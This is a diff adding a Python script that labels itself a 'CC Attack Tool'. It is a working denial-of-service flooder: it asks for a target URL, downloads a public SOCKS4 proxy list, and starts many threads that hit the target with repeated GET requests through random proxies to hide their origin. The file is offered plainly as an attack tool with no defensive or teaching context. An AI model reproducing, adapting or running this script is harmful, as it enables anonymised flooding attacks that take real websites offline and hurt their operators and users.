@@ -1,0 +1,87 @@
+import requests
+import random
+import time
+import threading
+from colorama import Fore
+
+print(Fore.GREEN + """    	     .,:ccllllc:,.              
+          .lOXWMMMMMMMMMWXOo,           
+        .lKWMMMMMMMMMMMMMMMMNk:.        
+      .oKWMMMMMMMMMMMMMMMMMMMMNx'       
+     .xWMMMMMMMMMMMMMMMMMMMMMMMWO'      
+     ;KMMMMMMMMMMMMMMMMMMMMMMMMMWd.     
+     :XNKXWMMMMMMMMMMMMMMMMMMNXXWk.     
+     ;Kx..:d0NMMMMMMMMMMMMXkc,.;0d.     
+     .OO'   .,oOXWMMMMNKkc'    c0:      
+      :KOc,.....:xXNNKd,....';oKk.      
+       cXMWXK000XOlccdKK00KXNWMNc       
+      .dWMMWX0XMNdcocckMMWX00NMNl       
+      .oXX0o..oWWNNWNXNMMK; .oKx'       
+        ....  cNXNNXXXOKWx.  ..         
+              ,KKKX000OKK;              
+              '0KKX0KK0X0'              
+              .OK0XKKK0XO.              
+              .k00K0K00Xk.              
+               ldxOxOkx0o               
+               ..',,;,',.               
+""")
+print("  CC Attack Tool Using Requests Module")
+print("      Code By GogoZin. -2019/8/2")
+
+def opth():
+	for i in range(thr):
+		x = threading.Thread(target=atk)
+		x.start()
+		print("Threads " + str(i+1) + " Created")
+		time.sleep(0.01)
+	print("Wait A Few Seconds For Threads Ready To Attack ...")
+
+def main():
+	global pprr
+	global list
+	global proxy
+	global url
+	global pwr
+	global thr
+	url = str(input(Fore.BLUE + "Target : " + Fore.WHITE))
+	thr = int(input(Fore.BLUE + "Threads : " + Fore.WHITE))
+	cho = str(input(Fore.BLUE + "Get Some Fresh Socks ? (y/n) : " + Fore.WHITE))
+	if cho =='y':
+		rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1000&country=all')
+		with open('socks.txt','wb') as fp:
+			fp.write(rsp.content)
+			print(Fore.YELLOW + "Sucess Get Fresh Socks List !")
+	else:
+		pass
+	list = str(input(Fore.BLUE + "Socks List (socks.txt): " + Fore.WHITE))
+	if list =="":
+		list = 'socks.txt'
+	else:
+		list = str(list)
+	pwr = int(input(Fore.BLUE + "CC.Power (1-100) : " + Fore.WHITE))
+	opth()
+
+def atk():
+	pprr = open(list).readlines()
+	proxy = random.choice(pprr).strip().split(":")
+	s = requests.session()
+	s.proxies = {}
+	s.proxies['http'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
+	s.proxies['https'] = ("socks4://"+str(proxy[0])+":"+str(proxy[1]))
+	time.sleep(10)
+	while True:
+		try:
+			s.get(url)
+			print(Fore.BLUE + "Socks Ddos From ~ [ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ]" + Fore.WHITE)
+			try:
+				for y in range(pwr):
+					s.get(url)
+			except:
+				s.close()
+		except:
+			s.close()
+			print(Fore.RED + "Can't Connet To This Socks . . . Skip ~>" + Fore.WHITE)
+
+
+if __name__ == "__main__":
+	main()
